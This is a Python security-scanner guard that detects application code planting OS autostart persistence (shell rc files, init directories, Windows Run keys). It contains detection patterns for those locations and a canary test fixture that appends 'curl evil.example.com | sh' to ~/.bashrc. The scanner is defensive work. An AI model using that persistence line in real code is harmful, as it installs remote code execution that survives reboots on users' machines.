"""Guard: no OS-level autostart/persistence mechanism written from app code (checklist §8, new item).

Modifying a shell startup file, a system-wide init directory, a macOS LaunchAgent, or
the Windows `Run` registry key is how malware survives a reboot: a backdoored
dependency or AI-agent skill plants itself so it restarts automatically. Ordinary
application code has essentially no legitimate reason to touch any of these.
Adapted from Datadog GuardDog's `threat-filesystem-autostart` source-code rule
(GuardDog screens third-party packages; this guard applies the same signatures to the
target app's own source).

Two tiers of signal:

  **system-wide startup location, reference alone (HIGH):** a literal reference to
  `/etc/init.d/`, `/etc/profile.d/`, or `~/.config/autostart/`: these are root-owned,
  system-wide locations; even a bare reference (not necessarily a write) is already
  unusual for application code to need.

  **user shell-config write (HIGH):** an actual file WRITE (`open(..., "w"/"a")`,
  `fs.writeFile`/`fs.appendFile`) targeting `.bashrc`/`.bash_profile`/`.profile`/
  `.zshrc`/`/etc/rc.local`, or Windows registry Run/RunOnce-key manipulation
  (`winreg.SetValueEx` targeting the Run/RunOnce path): reading these files has
  ordinary uses (a shell-completion installer checking what's already there); it's
  the WRITE that is the persistence signal.

Fires on Python/JS source when `python`/`javascript`/`typescript` is detected.
Suppress an audited case (a legitimate provisioning/dotfile-management tool) with a
whole-file pragma comment anywhere in the file:

    # security: allow-autostart-persistence-mechanism
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    pragma_present,
    read,
    rel,
    strip_js_comments,
    strip_python_strings,
)

_JS_SUFFIXES = (".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs")
_PY_SUFFIXES = (".py", ".pyi")

_SYSTEM_WIDE_PATH = re.compile(r"/etc/init\.d/|/etc/profile\.d/|\.config/autostart/")

_SHELL_CONFIG_PATH = re.compile(
    r"['\"][^'\"]*\.(?:bashrc|bash_profile|profile|zshrc)['\"]|/etc/rc\.local"
)
# One level of nested parens in the path argument, so the canonical one-liner
# `open(os.path.expanduser('~/.bashrc'), 'a')` reaches its mode (a bare `[^)]*` stopped at the
# inner call's `)`, a false negative; PR #1048 review L1).
_PY_FILE_WRITE_OPEN = re.compile(r"\bopen\s*\((?:[^()\n]|\([^()\n]*\))*,\s*['\"][wa]\+?['\"]")
_JS_FS_WRITE = re.compile(r"fs\s*\.\s*(?:writeFile|appendFile)(?:Sync)?\s*\(")

_WIN_RUN_KEY = re.compile(r"CurrentVersion\\\\Run(?:Once)?|CurrentVersion\\Run(?:Once)?", re.IGNORECASE)
_PY_WINREG_SET = re.compile(r"\bwinreg\s*\.\s*SetValueEx\s*\(")

_PRAGMA = re.compile(r"security:\s*allow-autostart-persistence-mechanism")
_STANDARDS = ["OWASP:A08", "CWE-506"]


class AutostartPersistenceMechanismGuard(Guard):
    id = "autostart-persistence-mechanism"
    title = "No OS-level autostart/persistence mechanism written from application code"
    area = "Code safety"

    # persist.py: open(bashrc_path, 'a').write(malicious_line) -> fires
    # autostart-persistence-mechanism/shell-config-write (HIGH).
    canary_plant = CanaryPlant(
        files={
            "persist.py": (
                "import os\n"
                "def install():\n"
                "    path = os.path.expanduser('~/.bashrc')\n"
                "    with open(path, 'a') as f:\n"
                "        f.write('curl evil.example.com | sh\\n')\n"
            ),
        },
        expects=frozenset({"autostart-persistence-mechanism/shell-config-write"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return bool({"python", "javascript", "typescript"} & profile.features)

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        seen: set[Path] = set()
        for f in iter_files(root, _PY_SUFFIXES + _JS_SUFFIXES):
            if f in seen:
                continue
            seen.add(f)
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        suffix = f.suffix.lower()
        text = read(f)
        if pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
            return []

        if suffix in _PY_SUFFIXES:
            code = strip_python_strings(text, filename=f)
            code = "\n".join(
                ln if not ln.lstrip().startswith("#") else "" for ln in code.splitlines()
            )
        else:
            code = strip_js_comments(text, strip_strings=False)

        out: list[Finding] = []
        lines = code.splitlines()
        for i, line in enumerate(lines, start=1):
            if _SYSTEM_WIDE_PATH.search(line):
                out.append(self._finding(root, f, i, "system-wide-startup-reference", "References a root-owned, system-wide startup location (/etc/init.d/, /etc/profile.d/, or ~/.config/autostart/): unusual for application code to need."))
                continue
            if _SHELL_CONFIG_PATH.search(line):
                window_start = max(0, i - 3)
                window = lines[window_start:i + 2]
                has_write = (
                    (suffix in _PY_SUFFIXES and any(_PY_FILE_WRITE_OPEN.search(w) for w in window))
                    or (suffix in _JS_SUFFIXES and any(_JS_FS_WRITE.search(w) for w in window))
                )
                if has_write:
                    out.append(self._finding(root, f, i, "shell-config-write", "A shell startup file (.bashrc/.bash_profile/.profile/.zshrc) or /etc/rc.local is opened for writing/appending: the classic autostart-persistence shape."))
            if suffix in _PY_SUFFIXES and _PY_WINREG_SET.search(line) and _WIN_RUN_KEY.search(code):
                out.append(self._finding(root, f, i, "windows-run-key-write", "`winreg.SetValueEx` writes to the Windows `Run`/`RunOnce` autostart registry key."))
        return out

    def _finding(self, root: Path, f: Path, line: int, rule_suffix: str, message: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="high",
            title=self.title,
            location=f"{rel(root, f)}:{line}",
            message=message,
            remediation=(
                "Remove the autostart/persistence code. If this is a genuinely maintained "
                "provisioning or dotfile-management tool, mark it with the inline suppress "
                "pragma."
            ),
            rule=f"autostart-persistence-mechanism/{rule_suffix}",
            standards=list(_STANDARDS),
        )
